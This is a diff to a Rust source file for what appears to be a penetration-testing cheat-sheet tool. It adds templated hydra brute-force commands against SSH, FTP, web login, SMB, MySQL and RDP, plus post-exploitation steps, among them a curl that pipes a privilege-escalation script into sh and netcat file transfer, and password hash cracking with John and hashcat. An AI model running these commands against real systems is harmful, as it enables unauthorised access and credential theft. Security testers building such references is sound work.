@@ -18,6 +18,9 @@ pub enum Category {
     Sqli,
     Shells,
     Cve,
+    Hydra,
+    Post,
+    Crypto,
 }
 
 impl Category {
@@ -29,6 +32,9 @@ impl Category {
             Category::Sqli => "💉 SQLi / XSS helpers",
             Category::Shells => "🐚 Reverse Shells",
             Category::Cve => "🔥 CVE Lookups",
+            Category::Hydra => "🔑 Brute Force (hydra)",
+            Category::Post => "🎯 Post-Exploitation",
+            Category::Crypto => "🔐 Crypto / Cracking",
         }
     }
 
@@ -40,6 +46,9 @@ impl Category {
             Category::Sqli,
             Category::Shells,
             Category::Cve,
+            Category::Hydra,
+            Category::Post,
+            Category::Crypto,
         ]
     }
 
@@ -51,6 +60,9 @@ impl Category {
             "sqli" => Some(Category::Sqli),
             "shells" => Some(Category::Shells),
             "cve" => Some(Category::Cve),
+            "hydra" | "brute" | "bruteforce" => Some(Category::Hydra),
+            "post" | "postex" | "privesc" => Some(Category::Post),
+            "crypto" | "crack" | "hash" => Some(Category::Crypto),
             _ => None,
         }
     }
@@ -570,7 +582,256 @@ pub const CVE_COMMANDS: &[Command] = &[
     },
 ];
 
-// ─── Registry ───────────────────────────────────────────────────────────────
+// ─── HYDRA ─────────────────────────────────────────────────────────────────
+
+pub const HYDRA_COMMANDS: &[Command] = &[
+    Command {
+        name: "SSH Brute",
+        description: "Brute-force SSH with wordlist",
+        template: "hydra -l {user} -P {wordlist} ssh://{target}",
+        params: &[
+            Param { key: "target", label: "Target IP", default: None },
+            Param { key: "user", label: "Username", default: Some("root") },
+            Param { key: "wordlist", label: "Password wordlist", default: Some("/usr/share/wordlists/rockyou.txt") },
+        ],
+        tags: &["hydra", "ssh", "brute"],
+        category: Category::Hydra,
+    },
+    Command {
+        name: "SSH Brute (userlist)",
+        description: "Brute SSH with userlist + passlist",
+        template: "hydra -L {userlist} -P {wordlist} ssh://{target}",
+        params: &[
+            Param { key: "target", label: "Target IP", default: None },
+            Param { key: "userlist", label: "User wordlist", default: Some("/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt") },
+            Param { key: "wordlist", label: "Password wordlist", default: Some("/usr/share/wordlists/rockyou.txt") },
+        ],
+        tags: &["hydra", "ssh", "brute"],
+        category: Category::Hydra,
+    },
+    Command {
+        name: "FTP Brute",
+        description: "Brute-force FTP",
+        template: "hydra -l {user} -P {wordlist} ftp://{target}",
+        params: &[
+            Param { key: "target", label: "Target IP", default: None },
+            Param { key: "user", label: "Username", default: Some("admin") },
+            Param { key: "wordlist", label: "Password wordlist", default: Some("/usr/share/wordlists/rockyou.txt") },
+        ],
+        tags: &["hydra", "ftp", "brute"],
+        category: Category::Hydra,
+    },
+    Command {
+        name: "HTTP POST Form Brute",
+        description: "Brute web login form",
+        template: "hydra -l {user} -P {wordlist} {target} http-post-form '{path}:{user_field}=^USER^&{pass_field}=^PASS^:{fail_string}'",
+        params: &[
+            Param { key: "target", label: "Target host", default: None },
+            Param { key: "path", label: "Login path", default: Some("/login.php") },
+            Param { key: "user", label: "Username", default: Some("admin") },
+            Param { key: "wordlist", label: "Password wordlist", default: Some("/usr/share/wordlists/rockyou.txt") },
+            Param { key: "user_field", label: "Username field name", default: Some("username") },
+            Param { key: "pass_field", label: "Password field name", default: Some("password") },
+            Param { key: "fail_string", label: "Failure indicator", default: Some("Invalid") },
+        ],
+        tags: &["hydra", "http", "form", "brute"],
+        category: Category::Hydra,
+    },
+    Command {
+        name: "SMB Brute",
+        description: "Brute-force SMB",
+        template: "hydra -l {user} -P {wordlist} smb://{target}",
+        params: &[
+            Param { key: "target", label: "Target IP", default: None },
+            Param { key: "user", label: "Username", default: Some("administrator") },
+            Param { key: "wordlist", label: "Password wordlist", default: Some("/usr/share/wordlists/rockyou.txt") },
+        ],
+        tags: &["hydra", "smb", "brute"],
+        category: Category::Hydra,
+    },
+    Command {
+        name: "MySQL Brute",
+        description: "Brute-force MySQL",
+        template: "hydra -l {user} -P {wordlist} mysql://{target}",
+        params: &[
+            Param { key: "target", label: "Target IP", default: None },
+            Param { key: "user", label: "Username", default: Some("root") },
+            Param { key: "wordlist", label: "Password wordlist", default: Some("/usr/share/wordlists/rockyou.txt") },
+        ],
+        tags: &["hydra", "mysql", "brute"],
+        category: Category::Hydra,
+    },
+    Command {
+        name: "RDP Brute",
+        description: "Brute-force RDP",
+        template: "hydra -l {user} -P {wordlist} rdp://{target}",
+        params: &[
+            Param { key: "target", label: "Target IP", default: None },
+            Param { key: "user", label: "Username", default: Some("administrator") },
+            Param { key: "wordlist", label: "Password wordlist", default: Some("/usr/share/wordlists/rockyou.txt") },
+        ],
+        tags: &["hydra", "rdp", "brute"],
+        category: Category::Hydra,
+    },
+];
+
+// ─── POST-EXPLOITATION ─────────────────────────────────────────────────────
+
+pub const POST_COMMANDS: &[Command] = &[
+    Command {
+        name: "LinPEAS",
+        description: "Linux privilege escalation automated checker",
+        template: "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
+        params: &[],
+        tags: &["linpeas", "privesc", "linux"],
+        category: Category::Post,
+    },
+    Command {
+        name: "WinPEAS",
+        description: "Windows privilege escalation checker",
+        template: "# Download and run winPEAS.exe or winPEAS.bat on target",
+        params: &[],
+        tags: &["winpeas", "privesc", "windows"],
+        category: Category::Post,
+    },
+    Command {
+        name: "pspy",
+        description: "Monitor Linux processes without root",
+        template: "./pspy64 -pf -i 1000",
+        params: &[],
+        tags: &["pspy", "cron", "monitor"],
+        category: Category::Post,
+    },
+    Command {
+        name: "Sudo Abuse",
+        description: "Check sudo permissions",
+        template: "sudo -l",
+        params: &[],
+        tags: &["sudo", "privesc"],
+        category: Category::Post,
+    },
+    Command {
+        name: "SUID Binaries",
+        description: "Find SUID binaries for privilege escalation",
+        template: "find / -perm -4000 -type f 2>/dev/null",
+        params: &[],
+        tags: &["suid", "privesc", "find"],
+        category: Category::Post,
+    },
+    Command {
+        name: "Writable passwd",
+        description: "Check if /etc/passwd is writable",
+        template: "ls -la /etc/passwd /etc/shadow",
+        params: &[],
+        tags: &["passwd", "writable", "privesc"],
+        category: Category::Post,
+    },
+    Command {
+        name: "Transfer file (Python)",
+        description: "Start Python HTTP server for file transfer",
+        template: "python3 -m http.server {port}",
+        params: &[
+            Param { key: "port", label: "Port", default: Some("8000") },
+        ],
+        tags: &["transfer", "http", "python"],
+        category: Category::Post,
+    },
+    Command {
+        name: "Transfer file (nc)",
+        description: "Transfer file with netcat",
+        template: "# Receiver: nc -lvnp {port} > {filename}\n# Sender: nc {target} {port} < {filename}",
+        params: &[
+            Param { key: "target", label: "Target IP", default: None },
+            Param { key: "port", label: "Port", default: Some("9001") },
+            Param { key: "filename", label: "Filename", default: Some("file.txt") },
+        ],
+        tags: &["transfer", "nc", "file"],
+        category: Category::Post,
+    },
+];
+
+// ─── CRYPTO / CRACKING ───────────────────────────────────────────────────
+
+pub const CRYPTO_COMMANDS: &[Command] = &[
+    Command {
+        name: "John — crack hash",
+        description: "Crack password hash with John",
+        template: "john --wordlist={wordlist} {hashfile}",
+        params: &[
+            Param { key: "hashfile", label: "Hash file", default: Some("hashes.txt") },
+            Param { key: "wordlist", label: "Wordlist", default: Some("/usr/share/wordlists/rockyou.txt") },
+        ],
+        tags: &["john", "crack", "hash"],
+        category: Category::Crypto,
+    },
+    Command {
+        name: "John — show cracked",
+        description: "Show cracked passwords",
+        template: "john --show {hashfile}",
+        params: &[
+            Param { key: "hashfile", label: "Hash file", default: Some("hashes.txt") },
+        ],
+        tags: &["john", "show", "cracked"],
+        category: Category::Crypto,
+    },
+    Command {
+        name: "Hashcat — crack",
+        description: "Crack with hashcat (GPU)",
+        template: "hashcat -m {hashmode} -a 0 {hashfile} {wordlist}",
+        params: &[
+            Param { key: "hashmode", label: "Hash mode (0=MD5, 100=SHA1, etc)", default: Some("0") },
+            Param { key: "hashfile", label: "Hash file", default: Some("hashes.txt") },
+            Param { key: "wordlist", label: "Wordlist", default: Some("/usr/share/wordlists/rockyou.txt") },
+        ],
+        tags: &["hashcat", "gpu", "crack"],
+        category: Category::Crypto,
+    },
+    Command {
+        name: "Base64 decode",
+        description: "Decode base64 string",
+        template: "echo '{b64}' | base64 -d",
+        params: &[
+            Param { key: "b64", label: "Base64 string", default: None },
+        ],
+        tags: &["base64", "decode"],
+        category: Category::Crypto,
+    },
+    Command {
+        name: "Base64 encode",
+        description: "Encode to base64",
+        template: "echo -n '{text}' | base64",
+        params: &[
+            Param { key: "text", label: "Text to encode", default: None },
+        ],
+        tags: &["base64", "encode"],
+        category: Category::Crypto,
+    },
+    Command {
+        name: "URL decode",
+        description: "URL-decode string",
+        template: "python3 -c \"import urllib.parse; print(urllib.parse.unquote('{url}'))\"",
+        params: &[
+            Param { key: "url", label: "URL-encoded string", default: None },
+        ],
+        tags: &["url", "decode"],
+        category: Category::Crypto,
+    },
+    Command {
+        name: "Generate wordlist (crunch)",
+        description: "Generate custom wordlist with crunch",
+        template: "crunch {min} {max} {charset} -o {output}",
+        params: &[
+            Param { key: "min", label: "Min length", default: Some("4") },
+            Param { key: "max", label: "Max length", default: Some("6") },
+            Param { key: "charset", label: "Character set", default: Some("abc123") },
+            Param { key: "output", label: "Output file", default: Some("wordlist.txt") },
+        ],
+        tags: &["crunch", "wordlist", "generate"],
+        category: Category::Crypto,
+    },
+];
+
+// ─── Registry ─────────────────────────────────────────────────────────────
 
 pub fn get_commands(category: &Category) -> &'static [Command] {
     match category {
@@ -580,10 +841,12 @@ pub fn get_commands(category: &Category) -> &'static [Command] {
         Category::Sqli => SQLI_COMMANDS,
         Category::Shells => SHELL_COMMANDS,
         Category::Cve => CVE_COMMANDS,
+        Category::Hydra => HYDRA_COMMANDS,
+        Category::Post => POST_COMMANDS,
+        Category::Crypto => CRYPTO_COMMANDS,
     }
 }
 
-/// Fill in template placeholders with provided params
 pub fn resolve_template(template: &str, params: &std::collections::HashMap<String, String>) -> String {
     let mut result = template.to_string();
     for (k, v) in params {
